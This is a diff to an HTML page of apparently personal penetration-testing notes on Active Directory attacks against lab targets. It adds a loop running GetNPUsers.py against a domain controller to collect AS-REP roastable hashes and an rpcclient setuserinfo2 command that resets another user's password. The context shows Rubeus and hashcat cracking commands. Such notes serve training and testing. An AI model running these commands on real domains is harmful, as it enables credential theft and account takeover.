@@ -181,6 +181,12 @@
 <h3 id="asrep-roasting-attack"><a class="header" href="#asrep-roasting-attack">ASREP Roasting Attack</a></h3>
 <pre><code>impacket-GetNPUsers htb.local/ -usersfile user.txt -format hashcat -outputfile hashes.domain.txt
 
+or this:
+
+for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.192 blackfield.local/$user | grep krb5asrep; done
+
+
+
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
 </code></pre>
 <pre><code>
@@ -193,6 +199,15 @@ cd C:\Tools
 .\Rubeus.exe asreproast /nowrap
 
 sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+</code></pre>
+<h3 id="password-reset-over-rpc"><a class="header" href="#password-reset-over-rpc">Password Reset over RPC</a></h3>
+<p>https://room362.com/posts/2017/reset-ad-user-password-with-linux/</p>
+<pre><code>Log into Rpc with the user who can change password of other user:
+
+rpcclient $&gt; setuserinfo2
+
+rpcclient $&gt; setuserinfo2 audit2020 23 'Bwiz123!!!'
+
 </code></pre>
 
                     </main>
